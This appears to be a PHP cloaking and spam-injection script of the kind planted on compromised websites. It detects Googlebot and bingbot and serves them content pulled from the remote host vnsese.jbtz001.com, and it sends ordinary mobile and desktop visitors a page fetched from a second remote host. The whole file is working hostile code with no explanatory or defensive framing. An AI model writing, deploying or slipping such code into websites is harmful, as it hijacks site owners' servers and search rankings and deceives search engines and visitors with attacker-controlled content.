<?php
function get_Data($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

$data_host = "http://vnsese.jbtz001.com/lunlianjsc.php";
$data_redt = "http://vnsese.jbtz002.com/vnvnvn.html";

$fullUrl = $_SERVER['REQUEST_URI'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

function is_Spider($userAgent) {
    return preg_match("/Googlebot|bingbot/i", $userAgent);
}

function is_User($userAgent) {
    return preg_match("/Android|iPhone|iPad|iPod|Symbian|Mac|Windows NT/i", $userAgent);
}

function is_Ents($link) {
    return preg_match("/\.bug|\.fdc|\.znb|\.msl|\.xml|\.htm|\.html|\.doc|\.ppt/i", $link);
}

if (is_Spider($userAgent)) {
    if (is_Ents($fullUrl)) {
        $url = $data_host . "?ac=html&host=" . urlencode($_SERVER['REQUEST_URI']);
        $response = get_Data($url);
        echo $response;
        exit;
    } else {
        $response = get_Data("http://vnsese.jbtz001.com/lunlian.php");
        echo $response;
        exit;
    }
}

if (is_User($userAgent) && is_Ents($fullUrl)) {
    $response = get_Data($data_redt);
    echo $response;
    exit;
}
?>
